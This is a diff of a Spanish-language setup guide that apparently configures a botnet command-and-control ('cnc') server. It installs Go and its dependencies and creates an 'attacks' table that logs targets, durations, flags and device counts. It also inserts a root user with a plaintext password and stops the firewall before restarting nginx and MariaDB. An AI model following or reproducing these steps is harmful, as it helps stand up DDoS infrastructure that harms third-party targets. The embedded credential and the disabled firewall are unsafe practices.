@@ -7,19 +7,38 @@ sudo apt-get install gcc g++ python3 python3-pip electric-fence sudo git nginx s
 
 //Descarga la version mas reciente de Golang
 
+# descargar Go
 cd /tmp
-wget https://dl.google.com/go/go1.20.linux-amd64.tar.gz
-sha256sum go1.20.linux-amd64.tar.gz
-sudo tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz
+wget https://go.dev/dl/go1.26.1.linux-amd64.tar.gz
+sha256sum go1.26.1.linux-amd64.tar.gz
+sudo tar -C /usr/local -xzf go1.26.1.linux-amd64.tar.gz
 export PATH=$PATH:/usr/local/go/bin
 export GOROOT=/usr/local/go
 export GOPATH=$HOME/Projects/Proj1
 export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
-export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bash_profile
+echo 'export GOPATH=$HOME/Projects/Proj1' >> ~/.bash_profile
+echo 'export PATH=$GOPATH/bin:$PATH' >> ~/.bash_profile
+
 source ~/.bash_profile
+
+#Dependencias
+
+cd ~/cnc
+go mod init cnc
+go get github.com/go-sql-driver/mysql
+go get github.com/mattn/go-shellwords
+go get github.com/alexeyco/simpletable
+go get github.com/bogdanovich/dns_resolver
+go get github.com/gorilla/mux
+go get github.com/mattn/go-sqlite3
+go get github.com/naoina/toml
+
+#Verificar
 go version
 go env
-cd ~/
+cat go.mod
+
 
 // Cambia la IP por la de tu VPS en :
 
@@ -79,14 +98,16 @@ INSERT INTO users VALUES(1,'root','c3r3z47746',1,1,0,0,864000,0,3,100,1790903892
 
 CREATE TABLE `attacks` (`target` TEXT NOT NULL,`duration` INTEGER NOT NULL,`flags` TEXT NOT NULL,`sent` INTEGER NOT NULL,`finish` INTEGER NOT NULL,`user` TEXT NOT NULL,`devices` INTEGER NOT NULL);
 
+
 .databases
+
+.quit
 
 # Arrastra data.sql ala carpeta Assets . si data.sql existe ya remplazala
 
 //Ejecuta
 
-service firewalld stop
-service iptables stop 
+service ufw stop 
 service nginx restart
 service mariadb restart
 
